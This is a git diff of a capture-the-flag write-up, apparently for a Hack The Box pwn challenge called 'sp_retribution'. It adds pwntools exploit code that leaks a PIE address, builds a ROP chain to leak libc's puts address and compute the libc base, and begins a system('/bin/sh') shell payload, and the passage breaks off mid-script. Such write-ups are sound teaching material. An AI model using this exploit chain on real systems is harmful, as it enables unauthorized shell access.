@@ -95,8 +95,50 @@ log.success('Calculated pie_base --> %#0x', elf.address)
 sh.interactive()
 ```
 
+7. Great! Now all we need is to leak the libc_puts address, then we can calculate the libc_base. 
 
-> FINAL SCRIPT
+> It's good knowing we have puts@got.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/41b541b2-2f67-42f8-9f2d-5a282d5135fc)
+
+
+8. There are few steps we need:
+
+- Grab the rdi gadget, then calculate it with base address.
+- get the RIP offset.
+- Checks interesting function to return to (need to loop so we can grab the leaked puts@got address.
+
+```
+padding + rdi_gadget + puts@got + puts@plt + sym.missile_launcher
+```
+
+> LEAK LIBC SNIPPET
+
+```py
+pop_rdi = 0x0000000000000d33
+log.success('pop_rdi_gadget --> %#0x', pop_rdi)
+
+calc_rdi = elf.address + pop_rdi
+log.success('Calculated pop_rdi gadget --> %#0x', calc_rdi)
+
+padding = 88
+p = flat([
+    asm('nop') * padding,
+    calc_rdi,
+    elf.got['puts'],
+    elf.plt['puts'],
+    elf.sym['main']
+])
+
+sh.sendlineafter(b':', p)
+```
+
+> RESULT - LEAKED LIBC PUTS
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8711dfc3-eddb-445f-b8a1-ea819fd8f5dc)
+
+
+> FULL SCRIPT - GRAB LIBC PUTS & CALCULATE THE LIBC_BASE
 
 ```py
 from pwn import *
@@ -117,11 +159,12 @@ library = './glibc/libc.so.6'
 libc = context.binary = ELF(library, checksec=False)
 
 sh = start()
-#pause()
+pause()
 sh.sendlineafter(b'>> ', b'2')
 # sending 7 bytes remembering there's null bytes so will be exact 8.
 sh.sendlineafter(b'= ', b'AAAAAAA') 
 
+## GRABBING PIE
 sh.recvuntil(b'y = AAAAAAA\n')
 get = sh.recvline().strip()
 print('THIS IS -->',get)
@@ -158,7 +201,80 @@ get = sh.recvline().strip()
 leaked_puts = unpack(get.ljust(8,b'\x00'))
 log.success('LEAKED PUTS --> %#0x', leaked_puts)
 
-libc.address = leaked_puts - 456352
+libc.address = leaked_puts - libc.sym['puts'] #456352 --> using vmmap shall gave the same result
+log.info('LIBC BASE --> %#0x', libc.address)
+```
+
+9. Finally we just need to send our `system("/bin/sh");` payload.
+
+```
+padding + rdi + /bin/sh\x00 + sym.system
+```
+
+> FINAL SCRIPT
+
+```py
+from pwn import *
+import os 
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './sp_retribution'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+sh = start()
+#pause()
+sh.sendlineafter(b'>> ', b'2')
+# sending 7 bytes remembering there's null bytes so will be exact 8.
+sh.sendlineafter(b'= ', b'AAAAAAA') 
+
+## GRABBING PIE
+sh.recvuntil(b'y = AAAAAAA\n')
+get = sh.recvline().strip()
+print('THIS IS -->',get)
+
+leak = unpack(get.ljust(8,b'\x00'))
+#print(leak)
+log.success('LEAKED PIE --> %#0x', leak)
+elf.address = leak - 3440
+log.success('Calculated pie_base --> %#0x', elf.address)
+
+pop_rdi = 0x0000000000000d33
+log.success('pop_rdi_gadget --> %#0x', pop_rdi)
+
+calc_rdi = elf.address + pop_rdi
+log.success('Calculated pop_rdi gadget --> %#0x', calc_rdi)
+
+padding = 88
+p = flat([
+    asm('nop') * padding,
+    calc_rdi,
+    elf.got['puts'],
+    elf.plt['puts'],
+    elf.sym['main']
+])
+
+sh.sendlineafter(b':', p)
+
+sh.recvline()
+sh.recvline()
+
+get = sh.recvline().strip()
+#print('PUTS -->',get)
+
+leaked_puts = unpack(get.ljust(8,b'\x00'))
+log.success('LEAKED PUTS --> %#0x', leaked_puts)
+
+libc.address = leaked_puts - libc.sym['puts'] #456352 --> using vmmap shall gave the same result
 log.info('LIBC BASE --> %#0x', libc.address)
 
 pay = flat([
